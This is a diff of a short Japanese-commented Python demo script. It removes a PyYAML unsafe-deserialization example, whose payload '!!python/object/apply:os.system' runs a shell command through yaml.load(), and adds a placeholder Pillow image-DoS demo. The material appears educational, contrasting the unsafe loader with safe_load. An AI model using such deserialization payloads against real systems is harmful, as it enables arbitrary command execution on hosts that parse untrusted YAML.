@@ -1,28 +1,22 @@
-import yaml
+from PIL import Image
 import os
 
-# 脆弱なPyYAMLでデシリアライズすると、os.system('whoami') を実行するペイロード
-malicious_yaml = "!!python/object/apply:os.system ['whoami']"
+# このファイル自体はただのプレースホルダです。
+# 実際に脆弱性をトリガーするには、特別に細工された画像ファイルが必要です。
+malicious_file = "potentially_harmful_image.png"
 
-print(f"使用中のPyYAMLバージョン: {yaml.__version__}")
-print("--- 脆弱な関数 yaml.load() の実行 ---")
+print(f"Pillowのバージョン: {Image.__version__}")
+print(f"'{malicious_file}' を開こうとしています...")
 
 try:
-    # この関数は信頼できないデータを扱うと非常に危険です
-    # PyYAML 5.3.1 では Loader の指定なしで動作します
-    # 最新版で脆弱性を再現するには yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader) のように指定します
-    result = yaml.load(malicious_yaml) 
-    print("コマンドが実行されました。")
-    
+    # 悪意のあるファイルを読み込むと、ここで大量のメモリが消費され
+    # プロセスがクラッシュする可能性があります。
+    with Image.open(malicious_file) as img:
+        print("画像を開きました（これは実際にはトリガーされません）。")
+        img.load()
+
+except FileNotFoundError:
+    print(f"エラー: '{malicious_file}' が見つかりません。")
+    print("これはデモです。もし悪意のある画像ファイルがあれば、ここでDoSが発生する可能性があります。")
 except Exception as e:
-    print(f"エラー: {e}")
-
-print("\n--- 安全な関数 yaml.safe_load() の実行 ---")
-
-try:
-    # safe_loadは、このような危険な処理を許可しないため安全です
-    safe_result = yaml.safe_load(malicious_yaml)
-    print(f"安全に処理されました。結果: {safe_result}")
-    
-except yaml.YAMLError as e:
-    print(f"悪意のあるYAMLがブロックされました: {e}")
+    print(f"画像の処理中にエラーが発生しました: {e}")
